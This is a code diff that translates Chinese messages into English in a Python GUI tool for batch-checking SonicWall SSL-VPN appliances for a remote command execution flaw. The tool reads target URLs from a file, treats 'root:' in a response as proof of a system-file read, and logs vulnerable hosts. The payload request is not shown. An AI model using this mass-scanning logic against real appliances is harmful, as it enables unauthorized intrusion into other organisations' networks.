@@ -16,37 +16,37 @@ def sonicwall_ssl_vpn_verify(url):
     try:
         r = requests.get(reqUrl, headers=header, verify=False, timeout=10)
         if r.status_code == 200 and 'root:' in r.text:
-            sonicwall_ssl_vpn_text.insert(END, "【！！！！！！】存在漏洞的url：" + url + "\n")
+            sonicwall_ssl_vpn_text.insert(END, "[! ! ! ! ! ! ] Vulnerable url:" + url + "\n")
             sonicwall_ssl_vpn_text.see(END)
             return 1
         else:
-            sonicwall_ssl_vpn_text.insert(END, "【×××】不存在漏洞的url：" + url + "\n")
+            sonicwall_ssl_vpn_text.insert(END, "[×]URL without vulnerability:" + url + "\n")
             sonicwall_ssl_vpn_text.see(END)
     except exceptions.HTTPError as e:
-        sonicwall_ssl_vpn_text.insert(END, "【×××】测试" + url + "时出现HTTP异常，错误内容:" + str(e.message) + "\n")
+        sonicwall_ssl_vpn_text.insert(END, "[×]An HTTP exception occurred when testing" + url + "the error content:" + str(e.message) + "\n")
         sonicwall_ssl_vpn_text.see(END)
     except:
-        sonicwall_ssl_vpn_text.insert(END, "【×××】不存在漏洞的url：" + url + "\n")
+        sonicwall_ssl_vpn_text.insert(END, "[×]URL without vulnerability:" + url + "\n")
         sonicwall_ssl_vpn_text.see(END)
     return 0
 def sonicwall_ssl_vpn_batch_verify(url):
     try:
         if sonicwall_ssl_vpn_verify(url) == 1:
-            with open("存在SonicWall SSL-VPN 远程命令执行漏洞的url.txt", "a+") as f:
+            with open("[exists]sonicwall_ssl_vpn_url", "a+") as f:
                 f.write(url + "\n")
             f.close()
     except Exception as err:
-        sonicwall_ssl_vpn_text.insert(END, "【×××】出现错误，错误原因：" + str(err) + "\n")
+        sonicwall_ssl_vpn_text.insert(END, "[×]The target request failed, and the error content:" + str(err) + "\n")
         sonicwall_ssl_vpn_text.see(END)
 def get_sonic_addr():
-    with open("修正后的url.txt","r") as f:
+    with open("corrected url.txt","r") as f:
         for address in f.readlines():
             address = address.strip()
             yield address
 def sonicwall_ssl_vpn_gui():
     sonicwall_ssl_vpn = Toplevel()
     sonicwall_ssl_vpn.geometry("1035x455")
-    sonicwall_ssl_vpn.title("SonicWall SSL-VPN 远程命令执行漏洞一把梭")
+    sonicwall_ssl_vpn.title("SonicWall SSL-VPN RCE [auto-muti-exp]")
     sonicwall_ssl_vpn.resizable(0, 0)
     logo = PhotoImage(file="./logo.ico")
     sonicwall_ssl_vpn.tk.call('wm', 'iconphoto', sonicwall_ssl_vpn._w, logo)
